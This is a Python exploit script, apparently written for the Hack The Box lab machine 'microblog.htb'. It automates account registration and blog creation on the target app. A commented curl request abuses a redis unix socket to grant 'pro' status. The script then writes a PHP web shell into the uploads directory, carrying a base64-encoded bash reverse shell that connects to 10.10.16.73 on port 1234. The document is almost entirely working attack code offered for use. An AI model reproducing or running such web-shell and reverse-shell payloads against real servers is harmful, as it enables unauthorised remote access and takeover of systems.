import requests
import os

base, subdo = "http://app.microblog.htb/", "http://banua.microblog.htb/" #Add Subdo to host first
username, password, blog = "banua", "banua", "banua"
ses = requests.Session()

def Login(ses, username, password):
	data = {"username":username,"password":password}
	res = ses.post(base+"login/index.php", data=data, allow_redirects=True)

def Register(ses, username, password):
	data = {"first-name":username,"last-name":username,"username":username,"password":password}
	res = ses.post(base+"register/index.php", data=data, allow_redirects=True)
	print(f"Account {username} Registered Successfully") if "Hello" in res.text else print("Something Error or Username Exist!")

def AddSite(ses, subdo):
	data = {"new-blog-name":subdo}
	res = ses.post(base+"dashboard/index.php", data=data, allow_redirects=True)
	print(f"Blog {subdo} Added!") if subdo in res.text else print("Something Error!")

def postImage(ses, username):
	with open("dummy.jpg", "rb") as file:
		data = {"id":"dummy"}
		files = {"image":file}
		res = ses.post(subdo+"edit/index.php", data=data, files=files, allow_redirects=True)
		check = ses.get(subdo+"uploads/dummy.png")
		print(check.text)

def postShell(ses, username):
	data = {"id":"/var/www/microblog/"+username+"/uploads/rev.php","txt":"<?php echo shell_exec('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjczLzEyMzQgMD4mMQo= | base64 -d | bash'); ?>"}
	res = ses.post(subdo+"edit/index.php", data=data, allow_redirects=True)
	check = ses.get(subdo+"uploads/rev.php")
	print(check.text)

# Register(ses, username, password)
# AddSite(ses, blog)
# print(ses.cookies.get_dict())
# os.system(f"curl -X 'HSET' http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:{username}%20pro%20true%20/abc")
# postImage(ses, username)
# postShell(ses,username)

# If Account Already Registered and Pro
# Login(ses,username, password)
# postShell(ses,username)

Register(ses,"cdd","cdd")